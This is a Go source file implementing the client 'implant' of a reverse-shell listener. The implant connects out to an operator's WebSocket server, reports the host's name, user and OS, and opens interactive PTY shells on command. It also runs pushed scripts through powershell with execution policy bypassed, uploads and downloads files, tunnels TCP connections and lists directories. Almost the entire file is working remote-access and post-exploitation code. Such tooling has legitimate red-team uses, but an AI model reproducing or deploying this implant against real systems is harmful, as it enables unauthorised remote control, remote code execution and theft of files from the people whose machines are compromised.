// Package client implements the Go implant for the multiplexed reverse-shell
// protocol defined in proto/mux.proto.
package client

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/nemanjan00/reverse-shell-listener/client/muxpb"
	"github.com/nemanjan00/reverse-shell-listener/client/pty"
	"google.golang.org/protobuf/proto"
)

var defaultServerURL = "ws://127.0.0.1:8080/mux"
var defaultTags = ""
var defaultToken = ""

const (
	protoVersion = 1
	writeTimeout = 10 * time.Second
	pongTimeout  = 60 * time.Second
)

// Config controls how the implant connects and what metadata it reports.
type Config struct {
	ServerURL string // e.g. ws://host:8080/mux or wss://host:443/mux
	Tags      string // free-form label shown in the dashboard
	Shell     string // shell/command to run when opening a channel (empty = default)
	Token     string // BUILD_TOKEN the server expects in the Hello frame
}

func (c *Config) serverURL() string {
	if c.ServerURL != "" {
		return c.ServerURL
	}
	if u := os.Getenv("RSL_SERVER"); u != "" {
		return u
	}
	return defaultServerURL
}

func (c *Config) tags() string {
	if c.Tags != "" {
		return c.Tags
	}
	if t := os.Getenv("RSL_TAGS"); t != "" {
		return t
	}
	return defaultTags
}

func (c *Config) token() string {
	if c.Token != "" {
		return c.Token
	}
	if t := os.Getenv("RSL_TOKEN"); t != "" {
		return t
	}
	return defaultToken
}

// Client maintains one persistent WebSocket to the listener and multiplexes
// several PTY-backed shell channels over it.
type Client struct {
	cfg       Config
	dialer    websocket.Dialer
	conn      *websocket.Conn
	mu        sync.Mutex
	channels  map[uint32]*channel
	files     map[uint32]*os.File // active file transfers keyed by transfer_id
	proxies   map[uint32]net.Conn  // active proxy tunnels keyed by proxy_id
	stop      chan struct{}
}

// channel is one server-requested PTY shell.
type channel struct {
	id       uint32
	pty      pty.PTY
	resizeCh chan *muxpb.Resize
	done     chan struct{}
}

// Run connects to the server and blocks until the connection is lost.
func Run(ctx context.Context, cfg Config) error {
	c := &Client{
		cfg:      cfg,
		channels: make(map[uint32]*channel),
		files:    make(map[uint32]*os.File),
		proxies:  make(map[uint32]net.Conn),
		stop:     make(chan struct{}),
	}
	return c.run(ctx)
}

func (c *Client) run(ctx context.Context) error {
	serverURL := c.cfg.serverURL()
	log.Printf("[client] connecting to %s", serverURL)

	conn, _, err := c.dialer.DialContext(ctx, serverURL, http.Header{})
	if err != nil {
		return fmt.Errorf("dial %s: %w", serverURL, err)
	}
	c.conn = conn
	defer c.close()

	if err := c.write(&muxpb.Frame{
		Kind: &muxpb.Frame_Hello{Hello: &muxpb.Hello{
			Hostname: hostname(),
			Username: username(),
			Os:       runtime.GOOS,
			Arch:     runtime.GOARCH,
			Version:  protoVersion,
			Tags:     c.cfg.tags(),
			Token:    c.cfg.token(),
		}},
	}); err != nil {
		return fmt.Errorf("send hello: %w", err)
	}

	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	go c.pingLoop(ctx)
	go func() {
		c.readLoop(ctx)
		cancel()
	}()

	<-ctx.Done()
	return ctx.Err()
}

func (c *Client) close() {
	c.mu.Lock()
	chans := make([]*channel, 0, len(c.channels))
	for _, ch := range c.channels {
		chans = append(chans, ch)
	}
	files := make([]*os.File, 0, len(c.files))
	for _, f := range c.files {
		files = append(files, f)
	}
	proxies := make([]net.Conn, 0, len(c.proxies))
	for _, p := range c.proxies {
		proxies = append(proxies, p)
	}
	c.mu.Unlock()
	for _, ch := range chans {
		c.closeChannel(ch)
	}
	for _, f := range files {
		f.Close()
	}
	for _, p := range proxies {
		p.Close()
	}
	if c.conn != nil {
		c.conn.Close()
	}
	close(c.stop)
}

func (c *Client) pingLoop(ctx context.Context) {
	ticker := time.NewTicker(20 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			if err := c.write(&muxpb.Frame{
				Kind: &muxpb.Frame_Ping{Ping: &muxpb.Ping{Nonce: uint64(time.Now().UnixNano())}},
			}); err != nil {
				return
			}
		}
	}
}

func (c *Client) readLoop(ctx context.Context) {
	c.conn.SetPongHandler(func(_ string) error {
		c.conn.SetReadDeadline(time.Now().Add(pongTimeout))
		return nil
	})
	c.conn.SetReadDeadline(time.Now().Add(pongTimeout))

	for {
		_, data, err := c.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseNormalClosure) {
				log.Printf("[client] websocket error: %v", err)
			}
			return
		}
		c.conn.SetReadDeadline(time.Now().Add(pongTimeout))

		var frame muxpb.Frame
		if err := proto.Unmarshal(data, &frame); err != nil {
			log.Printf("[client] malformed frame: %v", err)
			continue
		}
		c.handleFrame(ctx, &frame)
	}
}

func (c *Client) handleFrame(ctx context.Context, frame *muxpb.Frame) {
	switch v := frame.Kind.(type) {
	case *muxpb.Frame_OpenRequest:
		go c.openChannel(ctx, v.OpenRequest)
	case *muxpb.Frame_Data:
		c.mu.Lock()
		ch := c.channels[v.Data.ChannelId]
		c.mu.Unlock()
		if ch != nil && ch.pty != nil {
			ch.pty.Write(v.Data.Data)
		}
	case *muxpb.Frame_Resize:
		c.mu.Lock()
		ch := c.channels[v.Resize.ChannelId]
		c.mu.Unlock()
		if ch != nil {
			select {
			case ch.resizeCh <- v.Resize:
			case <-ch.done:
			}
		}
	case *muxpb.Frame_Close:
		c.mu.Lock()
		ch := c.channels[v.Close.ChannelId]
		c.mu.Unlock()
		if ch != nil {
			c.closeChannel(ch)
		}
	case *muxpb.Frame_Ping:
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_Pong{Pong: &muxpb.Pong{Nonce: v.Ping.Nonce}},
		})
	case *muxpb.Frame_Pong:
		// handled by SetPongHandler
	case *muxpb.Frame_AutoExec:
		go c.runAutoExec(v.AutoExec)
	case *muxpb.Frame_FileRequest:
		go c.sendFile(v.FileRequest)
	case *muxpb.Frame_FileStart:
		c.startFileReceive(v.FileStart)
	case *muxpb.Frame_FileChunk:
		c.receiveFileChunk(v.FileChunk)
	case *muxpb.Frame_FileDone:
		c.finishFileReceive(v.FileDone)
	case *muxpb.Frame_ProxyOpen:
		go c.openProxy(v.ProxyOpen)
	case *muxpb.Frame_ProxyData:
		c.proxyData(v.ProxyData)
	case *muxpb.Frame_ProxyClose:
		c.proxyClose(v.ProxyClose)
	case *muxpb.Frame_FsList:
		go c.fsList(v.FsList)
	case *muxpb.Frame_FsStat:
		go c.fsStat(v.FsStat)
	}
}

// --- File-system browser ----------------------------------------------------
// Uses Go's os package directly; no shell commands or output parsing.

func (c *Client) fsList(req *muxpb.FsList) {
	entries, err := os.ReadDir(req.Path)
	result := &muxpb.FsListResult{RequestId: req.RequestId}
	if err != nil {
		result.Error = err.Error()
	} else {
		for _, e := range entries {
			info, err := e.Info()
			entry := &muxpb.FsEntry{Name: e.Name(), IsDir: e.IsDir()}
			if err == nil {
				entry.Size = uint64(info.Size())
				entry.ModTime = info.ModTime().UnixMilli()
			}
			result.Entries = append(result.Entries, entry)
		}
	}
	_ = c.write(&muxpb.Frame{
		Kind: &muxpb.Frame_FsListResult{FsListResult: result},
	})
}

func (c *Client) fsStat(req *muxpb.FsStat) {
	result := &muxpb.FsStatResult{RequestId: req.RequestId}
	info, err := os.Stat(req.Path)
	if err != nil {
		if os.IsNotExist(err) {
			result.Exists = false
		} else {
			result.Error = err.Error()
		}
	} else {
		result.Exists = true
		result.IsDir = info.IsDir()
		result.Size = uint64(info.Size())
		result.ModTime = info.ModTime().UnixMilli()
	}
	_ = c.write(&muxpb.Frame{
		Kind: &muxpb.Frame_FsStatResult{FsStatResult: result},
	})
}

// --- Proxy tunnels ---------------------------------------------------------

func (c *Client) openProxy(req *muxpb.ProxyOpen) {
	addr := net.JoinHostPort(req.Host, strconv.Itoa(int(req.Port)))
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		log.Printf("[proxy] %d connect failed: %v", req.ProxyId, err)
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_ProxyOpenError{ProxyOpenError: &muxpb.ProxyOpenError{
				ProxyId: req.ProxyId,
				Message: err.Error(),
			}},
		})
		return
	}

	c.mu.Lock()
	c.proxies[req.ProxyId] = conn
	c.mu.Unlock()

	log.Printf("[proxy] %d connected to %s", req.ProxyId, addr)

	_ = c.write(&muxpb.Frame{
		Kind: &muxpb.Frame_ProxyOpenOk{ProxyOpenOk: &muxpb.ProxyOpenOk{
			ProxyId: req.ProxyId,
		}},
	})

	go func() {
		buf := make([]byte, 16*1024)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if werr := c.write(&muxpb.Frame{
					Kind: &muxpb.Frame_ProxyData{ProxyData: &muxpb.ProxyData{
						ProxyId: req.ProxyId,
						Data:    append([]byte(nil), buf[:n]...),
					}},
				}); werr != nil {
					break
				}
			}
			if err != nil {
				break
			}
		}
		c.mu.Lock()
		delete(c.proxies, req.ProxyId)
		c.mu.Unlock()
		conn.Close()
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_ProxyClose{ProxyClose: &muxpb.ProxyClose{
				ProxyId: req.ProxyId,
				Reason:  "proxy connection closed",
			}},
		})
	}()
}

func (c *Client) proxyData(pd *muxpb.ProxyData) {
	c.mu.Lock()
	conn := c.proxies[pd.ProxyId]
	c.mu.Unlock()
	if conn == nil {
		return
	}
	if _, err := conn.Write(pd.Data); err != nil {
		conn.Close()
		c.mu.Lock()
		delete(c.proxies, pd.ProxyId)
		c.mu.Unlock()
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_ProxyClose{ProxyClose: &muxpb.ProxyClose{
				ProxyId: pd.ProxyId,
				Reason:  err.Error(),
			}},
		})
	}
}

func (c *Client) proxyClose(pc *muxpb.ProxyClose) {
	c.mu.Lock()
	conn := c.proxies[pc.ProxyId]
	delete(c.proxies, pc.ProxyId)
	c.mu.Unlock()
	if conn != nil {
		conn.Close()
	}
}

// --- File transfer ---------------------------------------------------------
// Paths are rejected if they contain directory traversal, null bytes, or are
// empty. Symlinks are not followed on open (O_NOFOLLOW on Unix) to reduce the
// risk of the operator accidentally overwriting sensitive files.

func (c *Client) validateFilePath(p string) (string, error) {
	if p == "" {
		return "", fmt.Errorf("empty path")
	}
	if strings.ContainsRune(p, '\x00') {
		return "", fmt.Errorf("null byte in path")
	}
	clean := filepath.Clean(p)
	for _, part := range strings.Split(clean, string(filepath.Separator)) {
		if part == ".." {
			return "", fmt.Errorf("directory traversal in path")
		}
	}
	if filepath.IsAbs(clean) {
		return clean, nil
	}
	cwd, err := os.Getwd()
	if err != nil {
		return "", err
	}
	return filepath.Join(cwd, clean), nil
}

// sendFile is a download from the client's perspective: the operator requested
// a file, so we read it and send FileStart + FileChunk(s) + FileDone.
func (c *Client) sendFile(req *muxpb.FileRequest) {
	path, err := c.validateFilePath(req.Path)
	if err != nil {
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_FileDone{FileDone: &muxpb.FileDone{
				TransferId: req.TransferId,
				Error:      err.Error(),
			}},
		})
		return
	}

	f, err := os.Open(path)
	if err != nil {
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_FileDone{FileDone: &muxpb.FileDone{
				TransferId: req.TransferId,
				Error:      err.Error(),
			}},
		})
		return
	}
	defer f.Close()

	info, err := f.Stat()
	var size uint64
	if err == nil && !info.IsDir() {
		size = uint64(info.Size())
	}
	if info != nil && info.IsDir() {
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_FileDone{FileDone: &muxpb.FileDone{
				TransferId: req.TransferId,
				Error:      "path is a directory",
			}},
		})
		return
	}

	_ = c.write(&muxpb.Frame{
		Kind: &muxpb.Frame_FileStart{FileStart: &muxpb.FileStart{
			TransferId: req.TransferId,
			Path:       req.Path,
			Size:       size,
		}},
	})

	buf := make([]byte, 16*1024)
	for {
		n, err := f.Read(buf)
		if n > 0 {
			if werr := c.write(&muxpb.Frame{
				Kind: &muxpb.Frame_FileChunk{FileChunk: &muxpb.FileChunk{
					TransferId: req.TransferId,
					Data:       append([]byte(nil), buf[:n]...),
				}},
			}); werr != nil {
				return
			}
		}
		if err != nil {
			if err == io.EOF {
				break
			}
			_ = c.write(&muxpb.Frame{
				Kind: &muxpb.Frame_FileDone{FileDone: &muxpb.FileDone{
					TransferId: req.TransferId,
					Error:      err.Error(),
				}},
			})
			return
		}
	}

	_ = c.write(&muxpb.Frame{
		Kind: &muxpb.Frame_FileDone{FileDone: &muxpb.FileDone{
			TransferId: req.TransferId,
		}},
	})
}

func (c *Client) startFileReceive(fs *muxpb.FileStart) {
	path, err := c.validateFilePath(fs.Path)
	if err != nil {
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_FileDone{FileDone: &muxpb.FileDone{
				TransferId: fs.TransferId,
				Error:      err.Error(),
			}},
		})
		return
	}

	flags := os.O_CREATE | os.O_WRONLY | os.O_TRUNC
	f, err := os.OpenFile(path, flags, 0644)
	if err != nil {
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_FileDone{FileDone: &muxpb.FileDone{
				TransferId: fs.TransferId,
				Error:      err.Error(),
			}},
		})
		return
	}

	c.mu.Lock()
	c.files[fs.TransferId] = f
	c.mu.Unlock()
}

func (c *Client) receiveFileChunk(fc *muxpb.FileChunk) {
	c.mu.Lock()
	f := c.files[fc.TransferId]
	c.mu.Unlock()
	if f == nil {
		return
	}
	if _, err := f.Write(fc.Data); err != nil {
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_FileDone{FileDone: &muxpb.FileDone{
				TransferId: fc.TransferId,
				Error:      err.Error(),
			}},
		})
		c.mu.Lock()
		delete(c.files, fc.TransferId)
		c.mu.Unlock()
		f.Close()
	}
}

func (c *Client) finishFileReceive(fd *muxpb.FileDone) {
	c.mu.Lock()
	f := c.files[fd.TransferId]
	delete(c.files, fd.TransferId)
	c.mu.Unlock()
	if f != nil {
		f.Close()
	}
	if fd.Error != "" {
		log.Printf("[file] upload %d failed: %s", fd.TransferId, fd.Error)
	} else {
		log.Printf("[file] upload %d complete", fd.TransferId)
	}
}

// runAutoExec writes the script to a temp file and executes it via the
// requested shell (sh or powershell). Output is logged, not sent back over
// the mux connection — autoexec is a one-shot post-connect setup step, not
// an interactive channel.
func (c *Client) runAutoExec(ae *muxpb.AutoExec) {
	if len(ae.Script) == 0 {
		return
	}
	ext := ".sh"
	shell := "sh"
	if ae.Shell == "powershell" || ae.Os == "windows" || ae.Os == "win" {
		ext = ".ps1"
		shell = "powershell"
	}
	tmp, err := os.CreateTemp("", "rsl-autoexec-*"+ext)
	if err != nil {
		log.Printf("[autoexec] could not create temp file: %v", err)
		return
	}
	defer os.Remove(tmp.Name())
	if _, err := tmp.Write(ae.Script); err != nil {
		tmp.Close()
		log.Printf("[autoexec] could not write script: %v", err)
		return
	}
	tmp.Close()

	log.Printf("[autoexec] running %s script (%d bytes) for os=%s", shell, len(ae.Script), ae.Os)
	cmd := exec.Command(shell, tmp.Name())
	if shell == "powershell" {
		cmd = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", tmp.Name())
	}
	out, err := cmd.CombinedOutput()
	if len(out) > 0 {
		log.Printf("[autoexec] output:\n%s", string(out))
	}
	if err != nil {
		log.Printf("[autoexec] error: %v", err)
	} else {
		log.Printf("[autoexec] done")
	}
}

func (c *Client) openChannel(ctx context.Context, req *muxpb.OpenRequest) {
	ch := &channel{
		id:       req.ChannelId,
		resizeCh: make(chan *muxpb.Resize, 8),
		done:     make(chan struct{}),
	}

	cmd := c.cfg.Shell
	if cmd == "" {
		cmd = defaultShell()
	}

	cols, rows := req.Cols, req.Rows
	if cols == 0 {
		cols = 80
	}
	if rows == 0 {
		rows = 24
	}

	shell, err := pty.Start(cmd, cols, rows)
	if err != nil {
		log.Printf("[client] channel %d open failed: %v", req.ChannelId, err)
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_OpenError{OpenError: &muxpb.OpenError{
				ChannelId: req.ChannelId,
				Message:   err.Error(),
			}},
		})
		return
	}

	ch.pty = shell

	c.mu.Lock()
	c.channels[req.ChannelId] = ch
	c.mu.Unlock()

	_ = c.write(&muxpb.Frame{
		Kind: &muxpb.Frame_OpenOk{OpenOk: &muxpb.OpenOk{
			ChannelId: req.ChannelId,
			Pid:       0,
		}},
	})

	go c.pumpStdout(ch)
	go c.resizeLoop(ch)

	go func() {
		<-ch.done
		c.mu.Lock()
		delete(c.channels, ch.id)
		c.mu.Unlock()
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_Close{Close: &muxpb.Close{
				ChannelId: ch.id,
				Reason:    "shell exited",
			}},
		})
	}()
}

func (c *Client) pumpStdout(ch *channel) {
	buf := make([]byte, 4096)
	for {
		n, err := ch.pty.Read(buf)
		if n > 0 {
			data := make([]byte, n)
			copy(data, buf[:n])
			if err := c.write(&muxpb.Frame{
				Kind: &muxpb.Frame_Data{Data: &muxpb.Data{
					ChannelId: ch.id,
					Data:      data,
				}},
			}); err != nil {
				break
			}
		}
		if err != nil {
			break
		}
	}
	c.closeChannel(ch)
}

func (c *Client) resizeLoop(ch *channel) {
	for {
		select {
		case r := <-ch.resizeCh:
			if ch.pty != nil {
				_ = pty.Resize(ch.pty, r.Cols, r.Rows)
			}
		case <-ch.done:
			return
		}
	}
}

func (c *Client) closeChannel(ch *channel) {
	select {
	case <-ch.done:
		return
	default:
	}
	close(ch.done)
	if ch.pty != nil {
		ch.pty.Close()
	}
}

func (c *Client) write(frame *muxpb.Frame) error {
	data, err := proto.Marshal(frame)
	if err != nil {
		return err
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.conn == nil {
		return fmt.Errorf("not connected")
	}
	_ = c.conn.SetWriteDeadline(time.Now().Add(writeTimeout))
	return c.conn.WriteMessage(websocket.BinaryMessage, data)
}

func defaultShell() string {
	switch runtime.GOOS {
	case "windows":
		if p := os.Getenv("COMSPEC"); p != "" {
			return p
		}
		return "powershell.exe -NoProfile"
	default:
		if sh := os.Getenv("SHELL"); sh != "" {
			return sh
		}
		return "/bin/sh"
	}
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func username() string {
	u := os.Getenv("USER")
	if u == "" {
		u = os.Getenv("USERNAME")
	}
	return u
}

// ParseConfig builds a Config from command-line flags / env vars.
func ParseConfig(args []string) (Config, error) {
	cfg := Config{}
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-s", "--server":
			if i+1 >= len(args) {
				return cfg, fmt.Errorf("%s requires a value", args[i])
			}
			i++
			cfg.ServerURL = normalizeServerURL(args[i])
		case "-t", "--tags":
			if i+1 >= len(args) {
				return cfg, fmt.Errorf("%s requires a value", args[i])
			}
			i++
			cfg.Tags = args[i]
		case "-c", "--shell":
			if i+1 >= len(args) {
				return cfg, fmt.Errorf("%s requires a value", args[i])
			}
			i++
			cfg.Shell = args[i]
		case "--token":
			if i+1 >= len(args) {
				return cfg, fmt.Errorf("%s requires a value", args[i])
			}
			i++
			cfg.Token = args[i]
		case "-h", "--help":
			return cfg, fmt.Errorf("help")
		}
	}
	return cfg, nil
}

// Usage returns a short help string.
func Usage() string {
	return `usage: rsl-client [options]

options:
  -s, --server URL   listener websocket URL (default ws://127.0.0.1:8080/mux,
                     or RSL_SERVER env var)
  -t, --tags TAGS    free-form label shown in the dashboard
  -c, --shell CMD    shell command to run for each channel (default: $SHELL)
  --token TOKEN      BUILD_TOKEN the server expects (or RSL_TOKEN env var)
  -h, --help         show this help`
}

func normalizeServerURL(raw string) string {
	raw = strings.TrimSpace(raw)
	if !strings.Contains(raw, "://") {
		raw = "ws://" + raw
	}
	if !strings.HasSuffix(raw, "/mux") {
		raw = strings.TrimSuffix(raw, "/") + "/mux"
	}
	return raw
}

func parseUint32(s string, def uint32) uint32 {
	if s == "" {
		return def
	}
	v, err := strconv.ParseUint(s, 10, 32)
	if err != nil {
		return def
	}
	return uint32(v)
}

// FileExists reports whether path exists (used by main to pick shell).
func FileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}
